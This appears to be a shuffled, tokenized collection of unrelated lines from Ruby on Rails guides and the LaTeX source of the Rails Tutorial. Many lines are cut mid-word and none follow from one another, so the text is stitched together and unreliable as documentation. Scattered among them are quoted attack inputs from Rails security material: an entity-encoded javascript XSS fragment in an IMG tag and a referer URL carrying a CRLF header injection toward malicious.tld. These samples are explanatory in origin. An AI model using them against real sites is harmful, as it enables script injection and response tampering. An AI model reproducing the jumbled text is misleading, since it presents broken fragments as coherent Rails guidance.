NOTE : Defined in `active _ support / core _ ext / numeric / conversions ▖ rb` .
Let &apos;s also add a little CSS ( or , rather , SCSS ) for style ( Listing ~ \ ref { code : user _ index _ css } ) .
Instead , it performs the calculation directly in the database , asking the database to count the microposts with the given \ kode { user \ _ id } ( an operation for which all databases are highly optimized ) .
The result is breaking tests for application code that still works fine .
as shown in Listing ~ \ ref { code : rspec _ drb } .
Article ▖ where ( id : 10 , trashed : false ) ▖ unscope ( where : : id )
Hooking Into an Application
has _ many Association Diagram &#93; ( images / has _ many ▖ png )
Another is to \ emph { add } a unique username to the signup process and then use it in @ replies .
test : mysql2
# root &apos; welcome # index&apos;
The authentication machinery from Chapter ~ \ ref { cha : log _ in _ log _ out } will allow us to use a \ emph { before filter } to ensure that this is the case .
Article ▖ joins ( : category , : comments )
Using the \ kode { belongs \ _ to } / \ kode { has \ _ many } association defined in this section , Rails constructs the methods shown in Table ~ \ ref { table : association _ methods } .
Note that we have explicitly set the \ kode { created \ _ at } column using embedded Ruby .
In practice , though , it is a bad idea to rely on this fact ; as noted at \ href { http : / / email ▖ about ▖ com / od / emailbehindthescenes / f / email _ case _ sens ▖ htm } { about ▖ com } , ``Since the case sensitivity of email addresses can create a lot of confusion , interoperability problems and widespread headaches , it would be foolish to require email addresses to be typed with the correct case .
( For reasons that escape me , this is sometimes written as \ kode { rake cucumber : ok } ▖ )
A logged-in user with new links and a dropdown menu .
# = &gt; &lt; option value = &quot; # { person ▖ id } &quot; &gt; # { person ▖ name } &lt; / option &gt;
This new sanitizer uses &#91; Loofah &#93; ( https : / / github ▖ com / flavorjones / loofah ) internally ▖
attr _ internal : log _ level
@ routes = Engine ▖ routes
( Note the reuse of the \ kode { box \ _ sizing } mixin from Listing ~ \ ref { code : mixin _ and _ debug } ▖ )
nder &apos; layouts / rails _ default &apos; % &gt; ╼ &lt; % = render &apos; layouts / shim &apos; % &gt; ╼ &lt; / head &gt; ╼ &lt; body &gt; ╼ &lt; % = render &apos; layouts / header &apos; % &gt; ╼ &lt; div class = &quot; container &quot; &gt; ╼ &lt; % = yield % &gt; ╼ &lt; % = render &apos; layouts / footer &apos; % &gt; ╼ &lt; / div &gt; ╼ &lt; / body &gt; ╼ &lt; / html &gt; ╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ % subsection partials ( end ) ╼ ╼ % section header _ and _ menu ( end ) ╼ ╼ \ section { Sass and the asset pipeline } % ( fold ) ╼ \ label { sec : sass _ and _ the _ asset _ pipeline } ╼ ╼
created _ at : nil , updated _ at : nil &gt;
In the first line we do just that ( remember that ╼ `params &#91; : article &#93; ` contains the attributes we &apos;re interested in ) ▖
The problem with the data model in Figure ~ \ ref { fig : naive _ user _ has _ many _ following } is that it is terribly redundant : each row contains not only each followed user &apos;s id , but all their other information as well---all of which is \ emph { already } in the \ kode { users } table .
In addition to supporting subdomains , Heroku also supports custom domains .
X : : Y : : Z ▖ parent _ name # = &gt; &quot; X : : Y &quot;
Article ▖ where ( country : country )
The top portion of the index page displays the users ▖
Then the line
validates _ with GoodnessValidator
If you have migrations which rename the indexes , they are no longer needed .
full regex
Annotated ( 1 ) : User
The next section includes a \ kode { header } for the site &apos;s ( plain-text ) logo , a couple of divisions ( using the \ kode { div } tag ) , and a list of elements with navigation links :
create app / views / users / edit ▖ html ▖ erb
With that , the users index is fully functional , with all tests \ passing :
In contrast , both actions in Listing ~ \ ref { code : following _ followers _ actions } make an \ emph { explicit } call to \ kode { render } , in this case rendering a view called \ kode { show \ _ follow } , which we must create .
The result for our admin user appears in Figure ~ \ ref { fig : index _ delete _ links _ rails _ 3 } .
This repeated code is a violation of the important ``Don &apos;t Repeat Yourself &apos; &apos; ( DRY ) principle ; in this section we &apos;ll ``DRY out our code &apos; &apos; by removing the repetition .
&lt; a href = &quot; http : / / rubyonrails ▖ org &quot; &gt; A link &lt; / a &gt;
# = &gt; Sun , 28 Feb 2010 23 : 59 : 59 + 0000
use Rack : : Runtime
Applying the Sass nesting and variable definition features to the full SCSS file gives the file in Listing ~ \ ref { code : refactored _ scss } .
Now , if the current user is a special user , they &apos;ll get a special layout when viewing a product .
-------------------------------------------------------------------------------
Date : Sun , 24 Aug 2014 20 : 28 : 45 GMT
At this point , the test suite should be \ passing :
Y1 = : y1
But be warned : they accomplish their amazing fifteen-minute feat using a feature called \ emph { scaffolding } , which relies heavily on \ emph { generated code } , magically created by the Rails \ kode { generate scaffold } command .
The spacing might look slightly different , which is fine because ( as noted in Section ~ \ ref { sec : testing _ titles } ) HTML is insensitive to whitespace .
To login to the site , just follow this link : &lt; % = @ url % &gt; .
If your validator is complex enough that you want instance variables , you can ╼ easily use a plain old Ruby object instead :
queue _ as do
Every HTTP response from your Rails application receives the following default security headers .
Produce a string representation of a number as a percentage :
has _ many : products , dependent : : destroy
# Returns the full title on a per-page basis .
`Rails : : Rack : : Debugger` is primarily useful only in the development environment ▖
If you &apos;re using Git for version control , I suggest making a topic branch at this time :
( Note that there is no need to include a parameter for ~ \ kode { id } ; it is created automatically by Rails for use as the \ emph { primary key } in the database ▖ )
&#124; &#124; 409 &#124; : conflict &#124;
Adding a password and its confirmation ▖
# SELECT count ( * ) AS count _ all FROM clients WHERE ( first _ name = &apos; Ryan &apos; )
following
The custom validator is called using the ╼ `validates _ with` method .
Mpack tries to install malicious software through security holes in the web browser - very successfully , 50 % of the attacks succeed .
The resulting code ( which appears as a commented-out suggestion in the generated uploader ) verifies that the image filename ends with a valid image extension ( PNG , GIF , and both variants of JPEG ) , as shown in Listing ~ \ ref { code : validate _ picture _ format } .
The goal of this book is to be the best answer to the question , ``If I want to learn web development with \ href { http : / / rubyonrails ▖ org / } { Ruby on Rails } , where should I start ? &apos; &apos;
( Thanks to reader Jeremy Fleischman for pointing out this subtle issue ▖ )
This makes fields _ for suitable for specifying additional model objects in the same form :
Running \ kode { rails new } ( with a specific version number ) .
If we need to update only a single attribute , using the singular \ kode { update \ _ attribute } bypasses this restriction :
Many websites expose an Application Programmer Interface ( API ) so that third-party applications can get , post , put , and delete the application &apos;s resources .
Note that the name and email address you use in your Git configuration will be available in any repositories you make public .
Proc ▖ new do &#124; html _ tag , instance &#124;
# context where it is included ( article ▖ rb ) , rather than being
* ` : class _ name`
DELETE / articles / : id ( ▖ : format ) articles # destroy
d ▖ end _ of _ year # = &gt; Fri , 31 Dec 2010
For now , we can examine the implications of the user-micropost association by using the \ emph { console } , which is a useful tool for interacting with Rails applications .
Note that Listing ~ \ ref { code : demo _ gemfile _ sqlite _ version _ redux } is identical to Listing ~ \ ref { code : gemfile _ pg _ gem } .
A \ kode { Gemfile } with added gems .
yesterday
BEGIN
Server-Side Concerns
It &apos;s ╼ different from the `ActiveRecord : : Base # invalid ? ` method explained above because ╼ it doesn &apos;t verify the validity of the object as a whole ▖
The code in Listing ~ \ ref { code : email _ downcase } passes a block to the \ kode { before \ _ save } callback and sets the user &apos;s email address to a lower-case version of its current value using the \ kode { downcase } string method .
dasherize ? ?
When writing documentation for Rails , it &apos;s important to understand the difference between public user-facing API vs internal API .
* `ActionDispatch : : ShowExceptions` rescues any exception returned by the application and renders nice exception pages if the request is local or if `config ▖ consider _ all _ requests _ local` is set to `true` ▖
layout &apos; mailer&apos;
In the course of developing the core sample application , we &apos;ve now encountered four resources---users , sessions , account activations , and password resets---but only the first of these is backed by an Active Record model with a table in the database .
We would generate some HTML like this :
With the code in Listing ~ \ ref { code : login _ form } , the login form appears as in Figure ~ \ ref { fig : login _ form } .
if @ article ▖ update ( article _ params )
We need to select all the microposts from the \ kode { microposts } table with ids corresponding to the users being followed by a given user ( or the user itself ) .
Spend a couple of hours playing with \ href { http : / / www ▖ rubular ▖ com / } { Rubular } .
this would output the following :
The Static Pages controller generation in Listing ~ \ ref { code : generating _ pages } automatically updates the routes file ( \ kode { config / routes ▖ rb } ) , which we saw briefly in Section ~ \ ref { sec : hello _ world } .
&lt; ! &#91; endif &#93;
config ▖ to _ prepare do
`years _ since` moves forward in time :
Each request ╼ for a comment has to keep track of the article to which the comment is attached , ╼ thus the initial call to the `find` method of the `Article` model to get the ╼ article in question .
* `ActionDispatch : : RemoteIp` checks for IP spoofing attacks and gets valid `client _ ip` from request headers ▖
{ a : 1 } ▖ assert _ valid _ keys ( &quot; a &quot; ) # ArgumentError
respond _ with @ user
To install it , we run \ kode { bundle install } with a special flag :
&#124; &#124; 408 &#124; : request _ timeout &#124;
-------------------------------------------
d ▖ beginning _ of _ week # = &gt; Mon , 03 May 2010
If it contains extra paths , then an exception will be raised .
Listing ~ \ ref { code : sidebar _ css } includes the \ kode { ▖ gravatar \ _ edit } class , which we &apos;ll put to work in Chapter ~ \ ref { cha : updating _ showing _ and _ deleting _ users } .
To \ emph { mutate } the array , use the corresponding ``bang &apos; &apos; methods ( so-called because the exclamation point is usually pronounced ``bang &apos; &apos; in this context ) :
* `assert _ routing`
The `shallow` method of the DSL creates a scope inside of which every nesting is shallow ▖
It doesn &apos;t make sense for the host app to include ╼ ` &quot; blorgh / admin ▖ css &quot; ` in its stylesheets ▖
Using \ kode { has \ _ many } and \ kode { has \ _ many : through } with properly chosen class names and foreign keys , we can model both active ( following ) and passive ( being followed ) relationships .
When enabled , ╼ this passes responsibility for serving the file to the web server , which is ╼ faster ▖
create test / controllers / blorgh / articles _ controller _ test ▖ rb
&quot; # { title } &quot;
conflict config / environment ▖ rb
Join Filter : ( articles ▖ user _ id = users ▖ id )
# &lt; id type = &quot; integer &quot; &gt; 4356 &lt; / id &gt;
A user \ kode { has \ _ many } relationships , and---since relationships involve \ emph { two } users---a relationship \ kode { belongs \ _ to } both a follower and a followed user .
&lt; IMG SRC = &amp; # 106 ; &amp; # 97 ; &amp; # 118 ; &amp; # 97 ; &amp; # 115 ; &amp; # 99 ; &amp; # 114 ; &amp; # 105 ; &amp; # 112 ; &amp; # 116 ; &amp; # 58 ; &amp; # 97 ;
has _ one : account , inverse _ of : : supplier
NOTE : The name of the other model is pluralized when declaring a `has _ many` association .
# # # # Subset Conditions
The core method of this helper , form _ for , gives you the ability to create a form for a model instance ; for example , let &apos;s say that you have a model Person and want to create a new instance of it :
Because of the many methods supplied by Active Record , we won &apos;t ever need raw SQL in this book , and I &apos;ll omit discussion of the SQL commands from now on .
as seen in Listing ~ \ ref { code : help _ page _ passing } .
Now that we have a fresh and working Rails application , we &apos;ll take a moment for a step that , while technically optional , would be viewed by experienced software developers as practically essential : placing our application source code under \ emph { version control } .
You will need to add the `actionpack-xml _ parser` gem if you require this feature .
# = &gt; &lt; input type = &quot; hidden &quot; id = &quot; user _ token &quot; name = &quot; user &#91; token &#93; &quot; value = &quot; # { @ user ▖ token } &quot; / &gt;
In order to understand Ajax , you must first understand what a web browser does ╼ normally .
Since the Rails console automatically includes the Rails extensions , we can see an example here ( this won &apos;t work in plain \ kode { irb } ) :
( In fact , the tests for valid email addresses should have been passing all along ; since regexes are notoriously error-prone , the valid email tests are there mainly as a sanity check on \ kode { VALID \ _ EMAIL \ _ REGEX } ▖ )
Overview of helpers provided by Action View
A first , slightly incorrect , attempt appears in Listing ~ \ ref { code : failed _ signin _ attempt } .
Such customizations can easily be accomplished by passing options when you create the association ▖
The `exclusion` helper has an option ` : in` that receives the set of values that ╼ will not be accepted for the validated attributes ▖
Don &apos;t forget to review the difference , to see if there were any unexpected changes .
Adding Puma to the \ kode { Gemfile } .
Tests for the authorization of the following and followers pages ▖
As with the Users resource , we &apos;ll generate scaffold code for the Microposts resource using \ kode { rails generate scaffold } , in this case implementing the data model from Figure ~ \ ref { fig : demo _ micropost _ model }
The new test fails , as required :
params = Hash &#91; * params ▖ map { &#124; k , v &#124; &#91; k , v ▖ to _ s &#93; } ▖ flatten &#93;
&lt; / div &gt;
In Section ~ \ ref { sec : showing _ users } , this page will become the user &apos;s profile .
Next , the `scaffold _ controller` generator is invoked , generating a controller ╼ called `Blorgh : : ArticlesController` ( at ╼ `app / controllers / blorgh / articles _ controller ▖ rb` ) and its related views at ╼ `app / views / blorgh / articles` ▖
Thanks to reader \ href { https : / / twitter ▖ com / colmtuite } { Colm Tuite } for his excellent work in helping to convert the sample application over to the Bootstrap CSS framework .
This arranges to assign a particular value to the password and its confirmation at the same time ( in this case , a string of length ~ 5 , constructed using string multiplication as in Listing ~ \ ref { code : length _ validation _ test } ) .
Next , we need to run the migration on the production database to tell Heroku about the User data model :
If these steps seem mysterious , take heart : I &apos;m just following the instructions from the \ href { https : / / github ▖ com / twbs / bootstrap-sass # bootstrap-for-sass--- } { bootstrap-sass README file } .
A mockup of a ``forgot password &apos; &apos; link .
In the rare event that your application needs to run some code before Rails itself is loaded , put it above the call to `require &apos; rails / all &apos; ` in `config / application ▖ rb` .
Or consider deleting a customer , and ensuring that all of its orders get deleted as well :
It parses the ╼ response , then fetches all associated assets , like JavaScript files , ╼ stylesheets and images ▖
&#124; ` { &quot; person &quot; : &#91; null &#93; } ` &#124; ` { : person = &gt; nil } ` &#124;
Video tags can also have any of the HTML options specified at the end ( `id` , `class` et al ) .
Rails ▖ application ▖ routes ▖ draw do
For example :
As in Chapter ~ \ ref { cha : rails _ flavored _ ruby } , our tool of choice for exploring data models is the Rails console .
Our strategy will be to describe the results of a typical browser hit---a visit to the user index page at \ href { http : / / localhost : 3000 / users } { / users } ---in terms of MVC ( Figure ~ \ ref { fig : mvc _ detailed } ) .
Initializer files are loaded in alphabetical order by their path ▖
The result appears in Listing ~ \ ref { code : signin _ after _ signup _ test }
We can now simplify the tests for the Help , About , and Contact pages using the same methods used for the Home page .
Listing ~ \ ref { code : has _ many _ following _ through _ active _ relationships } keeps the \ kode { : source } key to emphasize the parallel structure with the \ kode { has \ _ many : following } association .
If you &apos;re interested in seeing the practical effect of this , take a look at the file \ kode { db / schema ▖ rb } , which should now include a line like this :
╼ ╼ \ section { Sessions } ╼ \ label { sec : sessions _ and _ failed _ login } ╼ ╼
NOTE : Defined in `active _ support / core _ ext / string / access ▖ rb` .
M ▖ reachable ?
The `initializer` method takes three arguments with the first being the name for the initializer and the second being an options hash ( not shown here ) and the third being a block ▖
Well , there will still be \ emph { one } thing left that we don &apos;t understand , which is how Rails ties this all together : mapping URLs to actions , making the \ kode { full \ _ title } helper available in views , etc ▖ This is an interesting subject , and I encourage you to investigate it further , but knowing exactly \ emph { how } Rails works is not necessary when \ emph { using } Rails .
&lt; % = f ▖ text _ area : text % &gt;
It &apos;s time now to get going with a Ruby on Rails development environment and our first application .
In order to do this , you &apos;ll need to have a git remote that points at the main ╼ Rails repository ▖
NOTE : Only equality , range and subset checking are possible with Hash conditions .
/ / = require core
The code in Listing ~ \ ref { code : minitest _ reporters } mixes single- and double-quoted strings .
@ article = Article ▖ new ( params &#91; : article &#93; )
wrap _ parameters format : &#91; : json &#93;
Then you can change `app / views / articles / show ▖ html ▖ erb` to look like the ╼ following :
Moreover , having a good test suite will allow us to \ emph { refactor } our code with confidence , changing its form without changing its function .
Be careful about security ; the API should only be accessible to authorized users .
Listing ~ \ ref { code : password _ migration } uses the \ kode { add \ _ column } method to add a \ kode { password \ _ digest } column to the \ kode { users } table .
Adding a sidebar to the user \ kode { show } view .
Skeleton for a string shuffle function .
# # # # Joining a Single Association
* `belongs _ to`
The password reset mailer method needed to get this working is nearly identical to the mailer for account activation developed in Section ~ \ ref { sec : account _ activation _ mailer } .
Moreover , you can apply both ` : if` and ╼ ` : unless` to the same validation .
I shall be late ! &quot; ▖ truncate ( 18 )
This means that the delete links won &apos;t work if the user has JavaScript disabled .
Currently , if our application &apos;s users forget their passwords , they have no way to retrieve them .
flash ▖ keys # = &gt; &#91; &quot; string &quot; , &quot; symbol &quot; &#93;
http : / / www ▖ yourapplication ▖ com / controller / action ? referer = http : / / www ▖ malicious ▖ tld % 0d % 0aX-Header : + Hi !
We can put the \ kode { log \ _ out } method to use in the Sessions controller &apos;s \ kode { destroy } action , as shown in Listing ~ \ ref { code : destroy _ session } .
cookies ▖ encrypted &#91; : expiration _ date &#93; = Date ▖ tomorrow # = &gt; Thu , 20 Mar 2014
Defaults to ` : scaffold _ controller` .
* &#91; jquery-ujs wiki &#93; ( https : / / github ▖ com / rails / jquery-ujs / wiki )
The generated view for the Help page .
As you might guess , each of these directories has a subdirectory for each asset class , e ▖ g ▖ ,
For example , looking at Listing ~ \ ref { code : typography _ css } and Listing ~ \ ref { code : footer _ css } , we see that there are repeated references to the same color :
# = &gt; &lt; input type = &quot; file &quot; id = &quot; user _ avatar &quot; name = &quot; user &#91; avatar &#93; &quot; / &gt;
The code in Listing ~ \ ref { code : password _ resets _ resource } arranges for the RESTful routes shown in Table ~ \ ref { table : RESTful _ password _ resets } .
* `orm` defines which orm to use ▖
Indeed , as noted in Section ~ \ ref { sec : layout _ link _ tests } , comprehensive tests of things like HTML structure are likely to be brittle and thus counter-productive .
Active Record automatically creates methods ╼ to allow an application to read and manipulate data stored within its tables .
A valid email regex that disallows double dots in email addressed .
ruby 2 ▖ 0 ▖ 0p353
You can override any of these defaults by specifying an appropriate option ( ` : media` , ` : rel` ) :
Now that we &apos;ve gotten to Green , we are free to refactor our code with confidence .
The relevant association declarations could look like this :
= &gt; 5242880
Somewhere in the mailer you could group locale-dependent bits like this :
git add : &quot; ▖ &quot;
Before moving on , let &apos;s take a minute to commit our changes and merge them into the master branch .
# # # Turning Digests Off
For this reason , when ` : minimum` is 1 you should ╼ provide a personalized message or use `presence : true` instead ▖
# Raise exception on mass assignment protection for Active Record models
Oh dear ! ▖ ▖ ▖ &quot;
&quot; : : X &quot; ▖ constantize # = &gt; : in _ Object
As noted in Section ~ \ ref { sec : a _ working _ sign _ in _ method } , information stored using \ kode { session } is automatically secure , but this is not the case with information stored using \ kode { cookies } .
@ article = Article ▖ find ( params &#91; : article _ id &#93; )
( The way to figure this out is to Ctrl-click and use your browser &apos;s web inspector ▖ )
d ▖ next _ week # = &gt; Mon , 10 May 2010
We can now include the follow form and the following statistics on the user profile page simply by rendering the partials , as shown in Listing ~ \ ref { code : user _ follow _ form _ profile _ stats } .
( If you want to run SSL on a custom domain , such as \ kode { www ▖ example ▖ com } , refer to \ href { http : / / devcenter ▖ heroku ▖ com / articles / ssl } { Heroku &apos;s page on SSL } ▖ )
For more information , read the &#91; Asset Pipeline guide &#93; ( asset _ pipeline ▖ html ) .
It is more explicit , though , and communicates our intentions more clearly both to Rails and to readers of our code ▖ )
# # # # Builder
You would expect each layout to have a different look and feel ▖
We &apos;ll start by giving users the ability to update their profiles , which will also provide a natural opportunity to enforce an authorization model ( made possible by the authentication code in Chapter ~ \ ref { cha : basic _ login } ) .
( The \ kode { before } method can also be invoked with \ kode { before ( : each ) } , which is a synonym ▖ )
An integration test for delete links and destroying users ▖
The &#91; Rails API documentation &#93; ( http : / / api ▖ rubyonrails ▖ org ) is generated with ╼ &#91; RDoc &#93; ( http : / / docs ▖ seattlerb ▖ org / rdoc / ) .
To modify this behavior you can set `statement _ limit` to a different value :
* : polymorphic
If you want to provide text formatting other than HTML ( due to security ) , use a mark-up language which is converted to HTML on the server-side ▖
# # # `to _ param`
If you get an error message saying that the Spring process id ( pid ) file would be overwritten by the merge , just remove the file using \ kode { rm -f * ▖ pid } at the command line .
In each of these cases , the named routes remain the same as if you did not use `scope` ▖
Rails 4 ▖ 1 now expects an explicit block to be passed when calling ╼ `ActiveSupport : : Callbacks ▖ set _ callback` ▖
The data model for users .
The Micropost data model .
The above returns `false` if the `clients` table is empty and `true` otherwise .
&gt; &gt; p ▖ save !
def update
A failed password reset .
Unfollowing a user by destroying a user relationship .
The macro `delegate` offers an easy way to forward methods .
You can also execute the `rake routes` command in your terminal to produce the same output .
The next step is to add all the project files to the repository using \ kode { git add -A } :
Because of the similarity with passwords and remember tokens , we will be able to reuse many of the same ideas for account activation ( as well as password reset ) , including the \ kode { User ▖ digest } and \ kode { User ▖ new \ _ token } methods and a modified version of the \ kode { user ▖ authenticated ? } \ method .
For other actions , you just need to insert the action name as the first element of the array :
def undecorated _ table _ name ( class _ name = base _ class ▖ name )
Once an Active Record object has been retrieved , its attributes can be modified ╼ and it can be saved to the database .
While it &apos;s not strictly necessary as part of a Rails 3 ▖ 2 upgrade , you can start replacing any plugins by extracting them to gems and adding them to your Gemfile ▖
Adding \ kode { picture } to the list of permitted attributes .
config ▖ middleware ▖ delete &quot; ActionDispatch : : Session : : CookieStore &quot;
# # # # `humanize`
&lt; option value = &quot; 2 &quot; &gt; D ▖ Thomas &lt; / option &gt;
&#124; 1 &#124; SIMPLE &#124; users &#124; const &#124; PRIMARY &#124;
validates _ with GoodnessValidator , fields : &#91; : first _ name , : last _ name &#93;
If we need to update only a single attribute , using the singular \ kode { update \ _ attribute } bypasses this restriction :
To avoid that , ╼ you must create a unique index on both columns in your database ▖
Since our application lacks unique user logins , you will also have to decide on a way to represent users .
As a second step , _ it is good practice to escape all output of the application _ , especially when re-displaying user input , which hasn &apos;t been input-filtered ( as in the search form example earlier on ) ▖
Since Ruby implicitly returns the value of the last expression in a function , here the \ texttt { foo } method returns \ texttt { &quot; bar &quot; } or \ texttt { &quot; baz &quot; } depending on the value of \ texttt { boolean ? } .
Tests for password length and the \ kode { authenticate } method .
Next we &apos;ll add some CSS that will be used site-wide for styling the layout and each individual page , as shown in Listing ~ \ ref { code : universal _ css } .
person = Person ▖ create ( name : &apos; Honda &apos; )
* `collection ▖ destroy ( object , ▖ ▖ ▖ )
Virtually all web applications require a login and authentication system of some sort .
Don &apos;t use this name yourself ; it &apos;s already taken by me !
\ begin { equation } ╼ \ label { eq : delta _ p } ╼ \ Delta t _ r = t _ N - t _ r ╼ \ end { equation }
will produce this HTML :
If you &apos;d rather play around in the console , `rails console` will also work just ╼ like a Rails application ▖
As of Rails 4 ▖ 2 , there &apos;s an even more direct way to get debugging information using the \ texttt { byebug } gem ( Listing ~ \ ref { code : gemfile _ sample _ app } ) .
The user edit page ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 1 / edit } { / users / 1 / edit } ) .
# # # # Spacer Templates
To accomplish this , we &apos;ll generate a unique , secure remember token for each user and store it as a \ emph { permanent } cookie rather than one that expires on browser close .
Add tests for micropost pagination .
scope : published , - &gt; { where ( published : true ) }
The predicate `exclude ? ` tests whether a given object does * * not * * belong to the collection ▖
create app / models / blorgh / article ▖ rb
host : localhost
What is the value of the following expression ?
&quot; 2010-07-27 23 : 42 : 00 &quot; ▖ to _ time ( : utc ) # = &gt; Tue Jul 27 23 : 42 : 00 UTC 2010
The Sessions \ kode { create } action with friendly forwarding .
some _ code
unless params &#91; : token &#93; ▖ nil ?
A few fundamental objects in Ruby are singletons ▖
The new \ kode { README } file , \ kode { README ▖ md } .
&lt; span &gt;
The layout will be rendered together with the partial for each item in the collection ▖
Alternately , you can use the File menu to create a new file and then pick the proper directory when saving it .
The Relationship data model .
We can interact with Rails applications at the command line using the Rails console .
The solution to this particular problem is simple : create ╼ a controller called `ArticlesController` ▖
With the \ kode { log \ _ in } method defined in Listing ~ \ ref { code : log _ in _ success } , we &apos;re now ready to complete the session \ kode { create } action by logging the user in and redirecting to the user &apos;s profile page .
You can alias a model attribute having the corresponding three methods defined for you in one shot ▖
Many of Action Dispatcher &apos;s internal components are implemented as Rack middlewares ▖
Considering various idiosyncratic customizations , there are probably as many development environments as there are Rails programmers , but there are at least two broad types : text editor / command line environments , and integrated development environments ( IDEs ) .
since ( in )
Hashed password digests are often erroneously referred to as \ emph { encrypted passwords } .
As the last example implies , the second argument defaults to true , ╼ as in `const _ defined ? ` .
require _ dependency ( c )
n _ edit _ action ( end ) ╼ ╼ % section activating _ the _ account ( end ) ╼ ╼ \ subsection { Activation test and refactoring } % ( fold ) ╼ \ label { sec : activation _ test _ and _ refactoring } ╼ ╼
from Listing ~ \ ref { code : password _ reset _ form } to
This last example shows that you can chain pushes together , and also that , unlike arrays in many other languages , Ruby arrays can contain a mixture of different types ( in this case , integers and strings ) .
# If true , the base class of anonymous controllers will be inferred
Naturally , the former sends a \ texttt { POST } request to the Relationships controller to \ kode { create } a relationship , while the latter sends a \ texttt { DELETE } request to \ kode { destroy } a relationship .
The routes defined in Listing ~ \ ref { code : sessions _ resource } correspond to URLs and actions similar to those for users ( Table ~ \ ref { table : RESTful _ users } ) , as shown in Table ~ \ ref { table : RESTful _ sessions } .
&lt; strong &gt; Comment : &lt; / strong &gt;
The \ kode { User } class , with inheritance .
This includes the code \ kode { match : : first } , which tells Capybara that we don &apos;t care \ emph { which } delete link it clicks ; it should just click the first one it sees .
This is a remarkable amount of functionality for only twelve lines of code .
Tealeaf is an especially good choice if you want instructor feedback within the context of a structured curriculum .
as shown in Listing ~ \ ref { code : admin _ factory } .
In the \ emph { Rails Tutorial } , we &apos;ll follow the common convention of using the \ kode { path } form except when doing redirects , where we &apos;ll use the \ kode { url } form .
+ ---- + ------------- + ---------- + ------- + --------------- +
The ╼ venerable html-scanner approach is now officially being deprecated in favor of ╼ &#91; `Rails HTML Sanitizer` &#93; ( https : / / github ▖ com / rails / rails-html-sanitizer ) .
&lt; a href = &quot; # &quot; onclick = &quot; paintIt ( this , &apos; # 009900 &apos; , &apos; # FFFFFF &apos; ) &quot; &gt; Paint it green &lt; / a &gt;
TIP : To stop the web server , hit Ctrl + C in the terminal window where it &apos;s ╼ running ▖
The issue is that the contents of the flash persist for one \ emph { request } , but---unlike a redirect , which we used in Listing ~ \ ref { code : signup _ flash } ---re-rendering a template with \ kode { render } doesn &apos;t count as a request ▖ The result is that the flash message persists one request longer than we want .
# # # # Linking to JavaScript Files with the `javascript _ include _ tag`
The name \ kode { user } is immaterial---we could have written \ kode { @ users ▖ each do &#124; foobar &#124; } and then used \ kode { render foobar } .
╼ $ ▖ / configure &amp; &amp; make &amp; &amp; sudo make install
The `mass _ assignment _ sanitizer` configuration setting should also be be added to `config / environments / test ▖ rb` :
100 ▖ to _ s ( : percentage )
The \ kode { full \ _ title } helper returns a base title , ``Ruby on Rails Tutorial Sample App &apos; &apos; , if no page title is defined , and adds a vertical bar preceded by the page title if one is defined ( Listing ~ \ ref { code : title _ helper } )
$ cd blog
Conditions
To get us started , the command in Listing ~ \ ref { code : generate _ user _ model } produced an initial test for testing users , though in this case it &apos;s practically blank ( Listing ~ \ ref { code : default _ user _ test } ) .
\ emph { Note } : If you do end up using Heroku for a real-life application , be sure to follow the production webserver configuration in Section ~ \ ref { sec : professional _ grade _ deployment } .
53 ▖ ordinalize # = &gt; &quot; 53rd &quot;
We begin the Microposts resource by creating a Micropost model , which captures the essential characteristics of microposts .
The same parallel structure applies to deleting users , with \ kode { delete } instead of \ kode { post } .
We can use `content _ for` to include this JavaScript on our special page without fattening up the rest of the site .
&quot; helpers / # { module _ path } _ helper &quot;
@ part ▖ assemblies ▖ delete ( @ assembly1 )
# save a reference to the original process method
You can help test performance with these additions to your test environment :
Rails helpers often take options hashes in this way , giving us the flexibility to add arbitrary HTML options without ever leaving Rails .
It will also create the `preview _ new _ comment _ url` and `preview _ new _ comment _ path` route helpers .
Note that , as in the profile sidebar ( Listing ~ \ ref { code : user _ show _ microposts } ) , the user info in Listing ~ \ ref { code : user _ info } displays the total number of microposts for the user .
In addition , the code takes advantage of some of the methods available for an ╼ association ▖
namespace : admin do
* `save`
&#124; &#124; 411 &#124; : length _ required &#124;
You can leave out the ` : on` option , this will create the same member route except that the resource id value will be available in `params &#91; : photo _ id &#93; ` instead of `params &#91; : id &#93; ` .
After that , it adjusts the time calling `since` with the number of seconds to advance ▖
Defaults to ` : controller` .
Carefully inspecting the debug information in Figure ~ \ ref { fig : initial _ failed _ signin _ rails _ 3 } shows that , as hinted at the end of Section ~ \ ref { sec : signin _ form } , the submission results in a \ kode { params } hash containing the email and password under the key \ kode { session } , which ( omitting some irrelevant details used internally by Rails ) appears as follows :
* `template _ engine` defines which template engine to use , such as ERB or Haml ▖
display : table ;
Will be available if `config ▖ force _ ssl` is set to `true` ▖
&lt; Choose &apos; squash &apos; for all of your commits except the first one ▖ &gt;
* How to handle Ajax on the server side .
url : sqlite3 : NOT _ my _ database
The \ emph { Rails Tutorial } covers all the web-specific ideas you &apos;ll need , so don &apos;t worry if you don &apos;t currently know a \ texttt { POST } from a \ texttt { PATCH } .
Because the practice of adding Ajax to web forms is quite common , Rails makes Ajax easy to implement .
# # # `acts _ like ? (
As shown in Figure ~ \ ref { fig : cloud9 _ new _ workspace } , create a workspace called ``rails-tutorial &apos; &apos; ( \ emph { not } ``rails \ _ tutorial &apos; &apos; ) , set it to ``Private to the people I invite &apos; &apos; , and select the icon for the Rails Tutorial ( \ emph { not } the icon for Ruby on Rails )
Add this address to the list of invalid addresses in Listing ~ \ ref { code : email _ format _ validation _ tests } to get a failing test , and then use the more complicated regex shown in Listing ~ \ ref { code : better _ email _ regex } to get the test to pass .
We end our tour of Ruby with a complete class of our own , a \ kode { User } class that anticipates the User model coming up in Chapter ~ \ ref { cha : modeling _ users } .
Login status is determined by the presence of a current user based on the temporary session &apos;s user id or the permanent session &apos;s unique remember token .
Suppressing the ri and rdoc documentation in \ kode { ▖ gemrc } .
in Listing ~ \ ref { code : signin _ features } and
# delegates to the receiver &apos;s class
Here the second command , \ kode { git branch } , just lists all the local branches , and the asterisk ~ \ kode { * } identifies which branch we &apos;re currently on .
One of the most common jobs in a modern web application is sending emails outside ╼ of the request-response cycle , so the user doesn &apos;t have to wait on it ▖
The third line is included only to ensure forward-compatibility with an upcoming release of Git .
You should put the `root` route at the top of the file , because it is the most popular route and should be matched first .
# # # Pure String Conditions
The full list of our planned links appears in Table ~ \ ref { table : url _ mapping } , along with their mapping to URLs and routes .
